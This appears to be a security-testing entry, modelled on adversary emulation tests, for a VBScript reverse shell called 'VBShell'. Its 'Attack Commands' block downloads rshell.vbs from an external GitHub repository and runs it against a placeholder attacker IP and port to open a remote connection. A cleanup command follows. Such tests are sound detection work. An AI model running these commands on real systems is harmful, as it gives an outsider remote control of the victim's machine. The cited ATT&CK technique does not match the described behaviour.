# VBShell - Tehtris Test: Running VBShell
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1486)
<blockquote>VBShell is a vbs script to run powershell commands. It downloads the payload through dns, and execute it in memory to establish a remote connection to a specified IP address and port.
</blockquote>

## Tehtris Tests

- [Tehtris Test - Running VBShell](#tehtris-test---VBShell)

<br/>

## Tehtris Test - Running VBShell
Methods to run a malicious behavior from a vbscript on a computer.

when sucessfully executed, the test downloads the payload and execute it in memory to establish a remote connection.

**Supported Platforms:** Windows


**auto_generated_guid:** f92a474f-abd9-491f-b338-95a101418ce3


#### Attack Commands: Run with `powershell`! 


```powershell
(New-Object System.Net.WebClient).DownloadFile("https://github.com/HakkYahud/Weapons/raw/main/rshell.vbs", "C:\Users\Public\rshell.vbs")
cscript.exe C:\Users\Public\rshell.vbs $attacker_ip $attacker_port
```

#### Cleanup Commands:
```powershell
del C:\Users\Public\rshell.vbs >nul 2> nul
```

<br/>
<br/>
